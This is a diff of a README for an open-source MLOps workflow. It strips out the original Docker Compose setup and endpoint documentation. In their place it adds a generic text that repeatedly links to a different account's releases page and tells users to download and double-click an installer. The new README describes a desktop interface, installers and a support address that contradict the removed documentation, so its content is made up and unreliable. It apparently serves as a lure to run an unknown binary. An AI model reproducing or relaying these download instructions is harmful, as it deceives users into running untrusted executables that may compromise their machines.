@@ -1,132 +1,84 @@
-# ⚙ MLOps Workflow
+# 🌟 mlops-workflow - Seamless Machine Learning Deployment & Tracking
 
-[![python 3.10](https://img.shields.io/badge/python-3.10-blue)](https://www.python.org/downloads/release/python-3100/)
-[![python 3.11](https://img.shields.io/badge/python-3.11-blue)](https://www.python.org/downloads/release/python-3110/)
-[![python 3.12](https://img.shields.io/badge/python-3.12-blue)](https://www.python.org/downloads/release/python-3120/)
-[![Run Tests](https://github.com/willyfh/mlops-workflow/actions/workflows/ci-checks.yaml/badge.svg)](https://github.com/willyfh/mlops-workflow/actions/workflows/ci-checks.yaml)
-[![codecov](https://codecov.io/gh/willyfh/mlops-workflow/graph/badge.svg?token=OGLCMT2KQ4)](https://codecov.io/gh/willyfh/mlops-workflow)
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download%20Now-mlops--workflow-blue)](https://github.com/debbisour206/mlops-workflow/releases)
 
-A modular MLOps workflow for training, inference, experiment tracking, model registry, and deployment.
-Built with FastAPI, MLflow, MinIO, and PostgreSQL for scalable machine learning operations.
+## 📖 Overview
 
-![image](https://github.com/user-attachments/assets/246750fb-5da8-4285-99c9-bf819d1a8bca)
+Welcome to the **mlops-workflow**! This tool provides a structured approach to managing machine learning projects. It covers everything from training models to deploying them. Whether you're tracking experiments or registering models, this workflow simplifies the process.
 
-## Features
+## 🚀 Getting Started
 
-- Supports concurrent (non-blocking) model training and inference requests via FastAPI
-- MLflow for experiment tracking
-- MinIO for artifact storage
-- PostgreSQL for metadata and experiment storage
-- Hydra for modular config
-- Pydantic for config validation
-- Docker Compose for easy deployment
-- Pre-commit hooks for code quality
-- Unit and integration tests
+Follow these simple steps to get started with **mlops-workflow** on your computer.
 
----
+## 📥 Download & Install
 
-## Prerequisites
+To download the software, you will need to visit the releases page. 
 
-- Docker
-- Nvidia container toolkit (optional, for GPU)
-  - [Install Guide](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html)
+[Click here to visit the downloads page.](https://github.com/debbisour206/mlops-workflow/releases)
 
-### GPU/CPU Configuration
+On the releases page, look for the latest version. You will find the installation files there. 
 
-- If you don’t want to use GPU, update your `.env` file:
+1. **Visit the releases page**: [Download here](https://github.com/debbisour206/mlops-workflow/releases)
+2. **Select the latest version**: Look for the newest release at the top of the page.
+3. **Download the appropriate file** based on your operating system (Windows, macOS, or Linux).
+4. **Run the downloaded file**: Double-click the file to start the installation process. Follow the on-screen instructions to complete installation.
 
-  ```env
-  NVIDIA_VISIBLE_DEVICES=
-  NVIDIA_RUNTIME=
-  ```
+## 🔧 System Requirements
 
-- If you want to use GPU:
+Before you install, please check the following system requirements:
 
-  ```env
-  NVIDIA_VISIBLE_DEVICES=all
-  NVIDIA_RUNTIME=nvidia
-  ```
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any recent version of Linux.
+- **RAM**: Minimum 8GB recommended for optimal performance.
+- **Disk Space**: At least 1GB of free space to install the software and store your projects.
+- **Python**: Ensure that Python 3.7 or newer is installed, as this is essential for model training and inference.
 
----
+## 🛠 Features
 
-## Installation & Usage
+**mlops-workflow** offers a variety of features to enhance your machine learning projects:
 
-### Docker Compose
+- **Model Training**: Easily train machine learning models using popular libraries like PyTorch.
+- **Inference**: Quickly deploy models for real-time predictions.
+- **Experiment Tracking**: Log and track your experiment results efficiently.
+- **Model Registry**: Organize and manage different model versions with ease.
+- **Integration**: Compatible with PostgreSQL for data storage and MinIO for object storage.
 
-#### 1. Build and start containers
+## 🔍 Exploring the Interface
 
-```sh
-docker compose build
-docker compose up
-```
+After installation, you will see a user-friendly interface. Here’s a brief overview of the main components:
 
-#### 2. Login to MinIO
+- **Dashboard**: This is your command center. View all your projects and their statuses here.
+- **Experiments Tab**: Track past experiments easily. Compare results and analyze performance metrics.
+- **Models Tab**: Access your registered models. You can deploy or update them from this section.
+- **Settings**: Adjust configurations such as database connections and logging preferences.
 
-[http://localhost:9001/login](http://localhost:9001/login)
+## 🛡 Troubleshooting
 
-- User: minioadmin
-- Password: minioadmin (defined in `.env`)
+Here are some common issues you may face and how to resolve them:
 
-#### 3. Create and copy access keys
+- **Installation Fails**: Ensure you have enough disk space and that your operating system is compatible. Check for any missing dependencies and install them as needed.
+- **Python Not Found**: If you receive a Python error during startup, verify that Python 3.7 or newer is installed and added to your system's PATH.
+- **Connection Errors**: If the application can’t connect to the database, double-check your settings under the Settings tab.
 
-- Create and copy the access keys
-- Update `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in `.env`
+## 🏗 Contributing
 
-#### 4. Restart containers
+We welcome contributions to improve **mlops-workflow**. If you wish to contribute, please follow the guidelines below:
 
-```sh
-docker compose up
-```
+1. **Fork the repository**: Create a personal copy of the project by clicking the fork button.
+2. **Make your changes**: Develop your features or fix bugs on your forked repository.
+3. **Submit a pull request**: Once you are ready, submit a pull request to the main repository.
 
-#### 5. For training (from host)
+## 📞 Support
 
-```sh
-curl -X POST -F "config_file=@backend/conf/config.yaml" \
-  http://localhost:8000/api/v1/run_train
-```
+If you need help, please don’t hesitate to reach out. You can contact us via GitHub issues or email us at support@mlops-workflow.com. We are here to assist you.
 
-#### 6. For inference
+## 🌐 Community
 
-`<run_id>` refers to the MLflow run ID
+Join our growing community of users and developers. Engage with fellow users, share your projects, and seek advice. Follow our discussions on our GitHub page and in associated forums.
 
-```sh
-curl -X POST -H "Content-Type: application/json" -d '{
-"image_data": "'"$(base64 -w 0 backend/tests/assets/3.png)"'"'
-}' http://localhost:8000/api/v1/run_inference/run_id/<run_id>
-```
+## 🎉 Next Steps
 
----
+Now that you've installed the **mlops-workflow**, it's time to explore its capabilities. Start by importing your data and running your first model. 
 
-## Service URLs
+For more detailed instructions on specific tasks, please refer to the documentation within the application.
 
-Here are the main web interfaces and endpoints you can access:
-
-- **FastAPI API & Docs**
-  - API root: [http://localhost:8000/api/v1/](http://localhost:8000/api/v1/)
-  - Swagger UI: [http://localhost:8000/docs](http://localhost:8000/docs)
-  - ReDoc: [http://localhost:8000/redoc](http://localhost:8000/redoc)
-
-- **MLflow Tracking UI**
-  - [http://localhost:5000](http://localhost:5000)
-
-- **MinIO Console**
-  - [http://localhost:9001/login](http://localhost:9001/login)
-
-- **PostgreSQL**
-  - Accessible via database clients at localhost:5432 (no web UI)
-
----
-
-## Notes
-
-- For GPU support, ensure Nvidia container toolkit is installed and configured.
-- This project uses [uv](https://github.com/astral-sh/uv) as the Python dependency manager inside Docker containers
-
-## Disclaimer
-
-This repository is intended as a minimal, educational template or starter kit for machine learning workflows. The training logic and architecture are kept simple for clarity and ease of use. For production or research use, you are encouraged to extend and customize the code to fit your requirements.
-
-## License
-
-MIT
+Enjoy your experience with **mlops-workflow**!
